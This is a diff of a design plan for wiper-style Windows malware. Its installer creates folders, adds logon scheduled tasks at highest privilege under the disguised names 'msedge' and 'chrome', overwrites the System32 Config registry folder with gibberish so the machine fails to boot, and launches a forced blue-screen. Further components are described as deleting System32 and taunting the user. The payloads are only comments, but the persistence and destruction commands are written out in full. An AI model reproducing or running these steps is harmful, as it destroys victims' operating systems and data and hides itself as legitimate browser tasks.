@@ -5,9 +5,10 @@ File tree:
 ├─Content
 │       │
 │       │
+│       ├─OSDATA
 │       ├─s32d.exe
-│       ├─*boot.bin
-│       ├─*main.exe
+│
+│
 │
 │
 ├─App.exe
@@ -18,18 +19,68 @@ File tree:
         ├─windows.exe
 
 
-Explanation:
+Program Files/WinSys/Main/
+│
+│
+├─Content
+│       │
+│       │
+│       ├─s32d.exe
+│
+│
+├─Startup
+        │
+        │
+        ├─BSOD.exe
+        ├─windows.exe
+
+
+Index:
 
 /App.exe:
-mkdir C:/Program Files/WinSys
-mkdir C:/Program Files/WinSys/Main
-mkdir C:/Program Files/WinSys/Main/Content
-copy /Startup/BSOD.exe, windows.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
-**schtasks /create /tn "msedge" /tr "File path to BSOD.exe" /sc onlogon /rl highest
-**schtasks /create /tn "chrome" /tr "File path to windows.exe" /sc onlogon /rl highest
+
+# Coded in C
 
 
+mkdir "C:/Program Files/WinSys"
+mkdir "C:/Program Files/WinSys/Main"
+mkdir "C:/Program Files/WinSys/Main/Content"
+mkdir "C:/Program Files/WinSys/Main/Startup"
 
+schtasks /create /tn "msedge" /tr "File path to BSOD.exe" /sc onlogon /rl highest
+schtasks /create /tn "chrome" /tr "File path to windows.exe" /sc onlogon /rl highest
+
+copy "Content/OSDATA" "C:/Windows/System32/Config"
+
+move "Content/s32d.exe" "C:/Program Files/WinSys/Main/Content"
+move "Startup/BSOD.exe" "C:/Program Files/WinSys/Main/Startup"
+move "Startup/windows.exe" "C:/Program Files/WinSys/Main/Startup"
+
+"C:/Program Files/WinSys/Main/Startup/BSOD.exe"
+--------------------------------------
+Content/s32d.exe:
+
+# Coded in C
+# Delete as much of System32 as it can
+
+--------------------------------------
+Startup/windows.exe:
+
+# Coded in C
+# Wait 15s then message box "You thought you could recover your system" then run s32d.exe
+
+--------------------------------------
+Startup/BSOD.exe:
+
+# Coded in C
+# Force a Blue Screen Of Death
+
+--------------------------------------
+Content/OSDATA:
+
+#gibberish text
+#throws an error on boot
+
+--------------------------------------
 Rewrite of original documentation plan
-* - Remove
-** - Add
+2026
